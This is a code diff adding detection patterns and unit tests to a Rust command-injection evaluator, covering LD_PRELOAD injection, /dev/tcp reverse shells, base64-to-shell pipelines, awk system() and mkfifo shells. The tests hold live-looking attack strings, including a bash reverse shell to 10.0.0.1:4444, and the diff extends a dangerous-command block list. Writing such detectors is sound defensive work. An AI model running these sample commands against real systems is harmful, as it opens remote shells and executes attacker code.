@@ -138,6 +138,16 @@ const KNOWN_DANGEROUS_COMMANDS: &[&str] = &[
     "scp",
     "sftp",
     "ftp",
+    "docker",
+    "kubectl",
+    "expect",
+    "gdb",
+    "lldb",
+    "nsenter",
+    "unshare",
+    "vim",
+    "vi",
+    "emacs",
 ];
 
 const SENSITIVE_FILES: &[&str] = &[
@@ -1468,6 +1478,146 @@ impl CmdInjectionEvaluator {
         }
     }
 
+    fn detect_env_and_interpreter_exec_primitives(
+        &self,
+        raw_input: &str,
+        dets: &mut Vec<L2Detection>,
+    ) {
+        static LD_PRELOAD_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\bLD_PRELOAD\s*=\s*[^\s;]+").unwrap()
+        });
+        static DYLD_LD_LIBRARY_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\b(?:DYLD_INSERT_LIBRARIES|LD_LIBRARY_PATH)\s*=\s*[^\s;]+").unwrap()
+        });
+        static DEV_TCP_UDP_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)/dev/(?:tcp|udp)/[0-9a-zA-Z.-]+/[0-9]+").unwrap()
+        });
+        static BASE64_ECHO_PIPE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\becho\b[^\n]{0,60}\|\s*base64\s+-d[^\n]{0,30}\|\s*(?:sh|bash|zsh|ash|dash)\b").unwrap()
+        });
+        static BASE64_DECODE_PIPE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\bbase64\s+(?:-d|--decode)[^\n]{0,30}\|\s*(?:sh|bash|zsh)\b")
+                .unwrap()
+        });
+        static ENV_DEBUG_INJECT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\b(?:BASH_ENV|PS4|PROMPT_COMMAND|ENV|CDPATH)\s*=\s*[^\s;]*\$\(")
+                .unwrap()
+        });
+        static AWK_SYSTEM_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\b(?:awk|gawk|mawk)\b[^\n]{0,200}\bsystem\s*\([^)]{0,100}\)")
+                .unwrap()
+        });
+        static AWK_GETLINE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\bawk\b[^\n]{0,200}\bgetline\s+<").unwrap()
+        });
+        static MKFIFO_SHELL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\bmkfifo\s+[^\s;]+[^\n]{0,100}(?:sh|bash|cat|nc|ncat)\b").unwrap()
+        });
+
+        for re in [&*LD_PRELOAD_RE, &*DYLD_LD_LIBRARY_RE] {
+            for m in re.find_iter(raw_input) {
+                dets.push(L2Detection {
+                    detection_type: "cmd_ld_preload".into(),
+                    confidence: 0.92,
+                    detail: "Dynamic loader environment variable injection detected".into(),
+                    position: m.start(),
+                    evidence: vec![ProofEvidence {
+                        operation: EvidenceOperation::PayloadInject,
+                        matched_input: m.as_str().to_owned(),
+                        interpretation: "LD_PRELOAD environment variable injection forces the process to load attacker-controlled shared libraries before all others, enabling arbitrary code execution at the shared library level".into(),
+                        offset: m.start(),
+                        property: "Process spawning must sanitize all environment variables. LD_PRELOAD must never be set from user input".into(),
+                    }],
+                });
+            }
+        }
+
+        for m in DEV_TCP_UDP_RE.find_iter(raw_input) {
+            dets.push(L2Detection {
+                detection_type: "cmd_dev_tcp_udp".into(),
+                confidence: 0.93,
+                detail: "Bash /dev/tcp or /dev/udp virtual device path detected".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "/dev/tcp and /dev/udp are bash-specific virtual devices used to establish network connections without external tools, commonly used for reverse shell establishment".into(),
+                    offset: m.start(),
+                    property: "Input must not contain bash network device paths that establish outbound connections".into(),
+                }],
+            });
+        }
+
+        for re in [&*BASE64_ECHO_PIPE_RE, &*BASE64_DECODE_PIPE_RE] {
+            for m in re.find_iter(raw_input) {
+                dets.push(L2Detection {
+                    detection_type: "cmd_base64_exec".into(),
+                    confidence: 0.91,
+                    detail: "Base64 decode pipeline into shell interpreter detected".into(),
+                    position: m.start(),
+                    evidence: vec![ProofEvidence {
+                        operation: EvidenceOperation::PayloadInject,
+                        matched_input: m.as_str().to_owned(),
+                        interpretation: "Base64-encoded payload piped to shell interpreter is a classic obfuscation technique to bypass command-based filters while executing arbitrary shell commands".into(),
+                        offset: m.start(),
+                        property: "Input must not contain base64 decode pipeline patterns that execute decoded content".into(),
+                    }],
+                });
+            }
+        }
+
+        for m in ENV_DEBUG_INJECT_RE.find_iter(raw_input) {
+            dets.push(L2Detection {
+                detection_type: "cmd_env_debug_inject".into(),
+                confidence: 0.89,
+                detail: "BASH_ENV/PS4/PROMPT_COMMAND environment command injection pattern detected"
+                    .into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "BASH_ENV/PS4/PROMPT_COMMAND injection executes attacker-controlled commands on bash startup or at shell prompt, enabling persistent code execution via environment variable manipulation".into(),
+                    offset: m.start(),
+                    property: "Shell environment variables must be sanitized. BASH_ENV, PS4, and PROMPT_COMMAND must never be set from user input".into(),
+                }],
+            });
+        }
+
+        for re in [&*AWK_SYSTEM_RE, &*AWK_GETLINE_RE] {
+            for m in re.find_iter(raw_input) {
+                dets.push(L2Detection {
+                    detection_type: "cmd_awk_system".into(),
+                    confidence: 0.90,
+                    detail: "awk system()/getline command execution primitive detected".into(),
+                    position: m.start(),
+                    evidence: vec![ProofEvidence {
+                        operation: EvidenceOperation::PayloadInject,
+                        matched_input: m.as_str().to_owned(),
+                        interpretation: "awk system() and getline directives execute OS commands within awk programs. User-controlled awk input can invoke arbitrary shell commands via these built-in functions".into(),
+                        offset: m.start(),
+                        property: "awk programs constructed from user input must be rejected. system() and getline calls must not execute attacker-controlled data".into(),
+                    }],
+                });
+            }
+        }
+
+        for m in MKFIFO_SHELL_RE.find_iter(raw_input) {
+            dets.push(L2Detection {
+                detection_type: "cmd_mkfifo_shell".into(),
+                confidence: 0.86,
+                detail: "mkfifo + shell channel pattern detected".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "mkfifo creates named pipe files used to establish bidirectional command channels. Combined with bash and nc, this creates interactive reverse shells through filesystem-based IPC".into(),
+                    offset: m.start(),
+                    property: "Input must not combine mkfifo with shell spawning commands for interactive shell establishment".into(),
+                }],
+            });
+        }
+    }
+
     fn detect_additional_evasion_patterns(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
         static SHELLSHOCK_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
             Regex::new(r"\(\)\s*\{\s*:;\s*\}").unwrap()
@@ -1631,6 +1781,7 @@ impl L2Evaluator for CmdInjectionEvaluator {
         self.detect_cloud_shell_patterns(&decoded, &mut dets);
         self.detect_wsl_bypass(&decoded, &mut dets);
         self.detect_blind_cmdi_dns(&decoded, &mut dets);
+        self.detect_env_and_interpreter_exec_primitives(&decoded, &mut dets);
         self.detect_additional_evasion_patterns(&decoded, &mut dets);
 
         // Sensitive file boost
@@ -1690,6 +1841,12 @@ impl L2Evaluator for CmdInjectionEvaluator {
             | "bash_here_string"
             | "bash_ansi_c_quote"
             | "bash_brace_expansion"
+            | "cmd_ld_preload"
+            | "cmd_dev_tcp_udp"
+            | "cmd_base64_exec"
+            | "cmd_env_debug_inject"
+            | "cmd_awk_system"
+            | "cmd_mkfifo_shell"
             | "container_docker_socket_escape"
             | "container_nsenter_escape"
             | "container_chroot_breakout"
@@ -2465,5 +2622,50 @@ mod tests {
             dets.iter()
                 .any(|d| d.detection_type == "here_string_injection")
         );
+    }
+
+    #[test]
+    fn test_ld_preload() {
+        let eval = CmdInjectionEvaluator;
+        let dets = eval.detect("LD_PRELOAD=/tmp/evil.so ./target");
+        assert!(dets.iter().any(|d| d.detection_type == "cmd_ld_preload"));
+    }
+
+    #[test]
+    fn test_dev_tcp() {
+        let eval = CmdInjectionEvaluator;
+        let dets = eval.detect("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
+        assert!(dets.iter().any(|d| d.detection_type == "cmd_dev_tcp_udp"));
+    }
+
+    #[test]
+    fn test_base64_exec() {
+        let eval = CmdInjectionEvaluator;
+        let dets = eval.detect("echo aWQK | base64 -d | sh");
+        assert!(dets.iter().any(|d| d.detection_type == "cmd_base64_exec"));
+    }
+
+    #[test]
+    fn test_env_debug() {
+        let eval = CmdInjectionEvaluator;
+        let dets = eval.detect("BASH_ENV=$(id) bash");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "cmd_env_debug_inject")
+        );
+    }
+
+    #[test]
+    fn test_awk_system() {
+        let eval = CmdInjectionEvaluator;
+        let dets = eval.detect("awk '{system(\"id\")}' /etc/passwd");
+        assert!(dets.iter().any(|d| d.detection_type == "cmd_awk_system"));
+    }
+
+    #[test]
+    fn test_mkfifo() {
+        let eval = CmdInjectionEvaluator;
+        let dets = eval.detect("mkfifo /tmp/f; cat /tmp/f | bash -i");
+        assert!(dets.iter().any(|d| d.detection_type == "cmd_mkfifo_shell"));
     }
 }
